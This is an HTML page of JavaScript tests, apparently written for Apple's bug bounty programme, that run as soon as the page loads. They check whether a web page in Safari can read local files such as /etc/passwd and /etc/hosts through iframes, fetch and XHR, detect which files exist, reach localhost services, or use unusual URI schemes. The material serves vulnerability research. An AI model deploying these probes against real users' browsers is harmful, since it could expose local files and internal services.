<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Origin File Access Tests - Apple Bug Bounty</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Monaco', 'Menlo', monospace;
        }
        body {
            background: #000;
            color: #00ff00;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .test-section {
            background: #111;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
        }
        .test-title {
            color: #ff6b6b;
            margin-bottom: 10px;
            font-size: 1.1em;
        }
        .status {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
            height: 500px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        .success { color: #00ff88; }
        .error { color: #ff4444; }
        .warning { color: #ffaa00; }
        .info { color: #66ccff; }
        .critical { color: #ff4444; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üåê Web Origin File Access Tests - Bug Bounty</h1>
        <p>Testing file system access from WEB ORIGIN (http/https)</p>

        <div class="test-section">
            <div class="test-title">üéØ Critical - File Protocol from Web Origin</div>
            <div id="criticalTests">Testing if web page can access file:// URLs...</div>
        </div>

        <div class="test-section">
            <div class="test-title">üìÅ File System Access API</div>
            <div id="fsTests">Testing modern File System APIs...</div>
        </div>

        <div class="test-section">
            <div class="test-title">üîç File Detection via Errors</div>
            <div id="detectionTests">Testing file existence detection...</div>
        </div>

        <div class="test-section">
            <div class="test-title">üì° Network & Localhost Access</div>
            <div id="networkTests">Testing local network access...</div>
        </div>

        <div class="test-section">
            <div class="test-title">‚ö° Safari-Specific Vulnerabilities</div>
            <div id="safariTests">Testing Safari-specific bypasses...</div>
        </div>

        <div class="status" id="statusLog">
            Web Origin File Access Test Log - Starting...
        </div>
    </div>

    <script>
        let logElement = document.getElementById('statusLog');

        function log(message, type = 'info') {
            const entry = document.createElement('div');
            entry.className = type;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logElement.appendChild(entry);
            logElement.scrollTop = logElement.scrollHeight;
        }

        // Test 1: Critical - Can we access file:// from web origin?
        async function testFileProtocolFromWebOrigin() {
            log('CRITICAL TEST: Attempting file:// access from web origin...', 'critical');
            const results = document.getElementById('criticalTests');

            const testPaths = [
                '/etc/hosts',
                '/Users/',
                '/System/',
                '/private/etc/passwd'
            ];

            let anySuccess = false;

            for (const path of testPaths) {
                try {
                    // Method 1: iframe with file://
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = `file://${path}`;
                    
                    iframe.onload = function() {
                        log(`üö® CRITICAL: IFRAME LOADED file://${path} FROM WEB ORIGIN!`, 'critical');
                        results.innerHTML += `<div class="critical">üö® IFRAME: file://${path} - VULNERABLE!</div>`;
                        anySuccess = true;
                    };
                    
                    iframe.onerror = function() {
                        log(`‚úÖ IFRAME BLOCKED: file://${path}`, 'success');
                    };
                    
                    document.body.appendChild(iframe);
                    setTimeout(() => {
                        if (document.body.contains(iframe)) {
                            document.body.removeChild(iframe);
                        }
                    }, 2000);

                    // Method 2: Fetch file://
                    try {
                        const response = await fetch(`file://${path}`);
                        if (response.ok) {
                            const content = await response.text();
                            log(`üö® CRITICAL: FETCH SUCCESS file://${path} - Content: ${content.substring(0, 100)}`, 'critical');
                            results.innerHTML += `<div class="critical">üö® FETCH: file://${path} - VULNERABLE!</div>`;
                            anySuccess = true;
                        }
                    } catch (e) {
                        // Expected to fail
                    }

                    // Method 3: XHR file://
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('GET', `file://${path}`, false);
                        xhr.onreadystatechange = function() {
                            if (xhr.readyState === 4 && xhr.status === 200) {
                                log(`üö® CRITICAL: XHR SUCCESS file://${path}`, 'critical');
                                results.innerHTML += `<div class="critical">üö® XHR: file://${path} - VULNERABLE!</div>`;
                                anySuccess = true;
                            }
                        };
                        xhr.send();
                    } catch (e) {
                        // Expected to fail
                    }

                    await new Promise(resolve => setTimeout(resolve, 500));
                } catch (error) {
                    log(`Error testing ${path}: ${error.message}`, 'error');
                }
            }

            if (!anySuccess) {
                results.innerHTML += '<div class="success">‚úÖ All file:// access blocked from web origin</div>';
            }
        }

        // Test 2: File System Access API
        async function testFileSystemAPI() {
            log('Testing File System Access API...', 'info');
            const results = document.getElementById('fsTests');

            // Modern File System Access API
            if ('showOpenFilePicker' in window) {
                log('‚ö†Ô∏è showOpenFilePicker API available', 'warning');
                
                try {
                    // This should require user gesture, but let's try anyway
                    const handles = await window.showOpenFilePicker();
                    log('üö® CRITICAL: showOpenFilePicker worked without user gesture!', 'critical');
                    results.innerHTML += '<div class="critical">üö® showOpenFilePicker - VULNERABLE!</div>';
                } catch (e) {
                    log(`‚úÖ showOpenFilePicker blocked: ${e.message}`, 'success');
                    results.innerHTML += '<div class="success">‚úÖ showOpenFilePicker requires user interaction</div>';
                }
            }

            // Legacy webkitRequestFileSystem
            if ('webkitRequestFileSystem' in window) {
                log('Testing webkitRequestFileSystem...', 'info');
                
                try {
                    window.webkitRequestFileSystem(window.TEMPORARY, 1024, function(fs) {
                        log('‚úÖ webkitRequestFileSystem sandbox access', 'success');
                        results.innerHTML += '<div class="success">‚úÖ webkitRequestFileSystem sandboxed</div>';
                    }, function(e) {
                        log(`‚úÖ webkitRequestFileSystem blocked: ${e.message}`, 'success');
                    });
                } catch (e) {
                    log(`‚úÖ webkitRequestFileSystem error: ${e.message}`, 'success');
                }
            }
        }

        // Test 3: File Existence Detection via Error Messages
        async function testFileExistenceDetection() {
            log('Testing file existence detection through error messages...', 'info');
            const results = document.getElementById('detectionTests');

            const testFiles = [
                'file:///etc/passwd',
                'file:///Users/Shared/test.txt',
                'file:///System/Library/CoreServices/SystemVersion.plist'
            ];

            for (const file of testFiles) {
                try {
                    // Try to load as image to detect existence
                    await new Promise((resolve) => {
                        const img = new Image();
                        img.onload = function() {
                            log(`üö® CRITICAL: File detected via image load: ${file}`, 'critical');
                            results.innerHTML += `<div class="critical">üö® Image detection: ${file}</div>`;
                            resolve();
                        };
                        img.onerror = function() {
                            // Different error messages might reveal file existence
                            resolve();
                        };
                        img.src = file;
                    });

                    // Try to load as script
                    const script = document.createElement('script');
                    script.src = file;
                    script.onerror = function(e) {
                        // Error message analysis might reveal file info
                    };
                    document.head.appendChild(script);
                    setTimeout(() => document.head.removeChild(script), 1000);

                } catch (e) {
                    // Continue testing
                }
            }

            results.innerHTML += '<div class="info">‚ÑπÔ∏è File detection attempts completed</div>';
        }

        // Test 4: Local Network & Service Access
        async function testLocalNetworkAccess() {
            log('Testing local network and service access...', 'info');
            const results = document.getElementById('networkTests');

            const localServices = [
                'http://localhost/',
                'http://127.0.0.1/',
                'http://localhost:631/', // CUPS
                'http://localhost:548/', // AFP
                'http://localhost:5900/', // VNC
                'http://localhost:8080/',
                'file://localhost/',
                'http://[::1]/'
            ];

            for (const service of localServices) {
                try {
                    const response = await fetch(service, { 
                        method: 'HEAD',
                        mode: 'no-cors'
                    });
                    log(`‚ö†Ô∏è Local service responded: ${service}`, 'warning');
                    results.innerHTML += `<div class="warning">‚ö†Ô∏è Local service: ${service}</div>`;
                } catch (e) {
                    // Expected to fail in most cases
                }
            }

            // Test iframe loading local services
            localServices.forEach(service => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = service;
                iframe.onload = function() {
                    log(`üö® CRITICAL: Local service loaded via iframe: ${service}`, 'critical');
                    results.innerHTML += `<div class="critical">üö® Local iframe: ${service}</div>`;
                };
                document.body.appendChild(iframe);
                setTimeout(() => {
                    if (document.body.contains(iframe)) {
                        document.body.removeChild(iframe);
                    }
                }, 3000);
            });
        }

        // Test 5: Safari-Specific Bypasses
        function testSafariSpecificBypasses() {
            log('Testing Safari-specific bypass methods...', 'info');
            const results = document.getElementById('safariTests');

            // Test WebKit specific features
            if (window.webkit) {
                log('‚úÖ WebKit environment detected', 'info');
                
                // Test for any WebKit-specific file access methods
                if (webkit.messageHandlers) {
                    log('‚ö†Ô∏è WebKit message handlers available', 'warning');
                    
                    // Try to find any file-related message handlers
                    const handlers = Object.keys(webkit.messageHandlers);
                    handlers.forEach(handler => {
                        log(`‚ÑπÔ∏è Message handler: ${handler}`, 'info');
                    });
                }
            }

            // Test for legacy Safari APIs that might bypass security
            if (window.openDatabase) {
                log('‚ö†Ô∏è WebSQL available (legacy)', 'warning');
                // WebSQL might have different security rules
            }

            // Test for any unusual URI schemes Safari might handle
            const unusualSchemes = [
                'x-file:///',
                'safari-file://',
                'webkit-file://',
                'localstorage://',
                'safari-extension://'
            ];

            unusualSchemes.forEach(scheme => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = scheme + 'etc/hosts';
                iframe.onload = function() {
                    log(`üö® CRITICAL: Unusual scheme loaded: ${scheme}`, 'critical');
                    results.innerHTML += `<div class="critical">üö® Scheme: ${scheme}</div>`;
                };
                document.body.appendChild(iframe);
                setTimeout(() => {
                    if (document.body.contains(iframe)) {
                        document.body.removeChild(iframe);
                    }
                }, 2000);
            });

            results.innerHTML += '<div class="info">‚ÑπÔ∏è Safari-specific tests completed</div>';
        }

        // Auto-execute all tests when hosted on web server
        window.addEventListener('load', () => {
            log('üåê WEB ORIGIN TESTS STARTING - Hosted from: ' + window.location.origin, 'critical');
            
            // Only run if we're on a web origin (not file://)
            if (window.location.protocol === 'http:' || window.location.protocol === 'https:') {
                log('‚úÖ Testing from web origin - this is what matters for bug bounty!', 'success');
                
                setTimeout(testFileProtocolFromWebOrigin, 1000);
                setTimeout(testFileSystemAPI, 3000);
                setTimeout(testFileExistenceDetection, 5000);
                setTimeout(testLocalNetworkAccess, 7000);
                setTimeout(testSafariSpecificBypasses, 9000);
            } else {
                log('‚ùå This test must be hosted on a web server (http/https) for valid bug bounty testing', 'error');
            }
        });

        // Additional vulnerability tests
        setTimeout(() => {
            // Test for any postMessage vulnerabilities
            window.postMessage('file:///etc/hosts', '*');
            
            // Test for any edge cases in error handling
            try {
                // This might reveal information in error messages
                const x = null;
                x.nonExistentMethod();
            } catch (e) {
                // Check if error reveals system information
                if (e.stack && e.stack.includes('file://')) {
                    log('üö® CRITICAL: Error stack reveals file:// paths!', 'critical');
                }
            }
        }, 11000);

    </script>
</body>
</html>
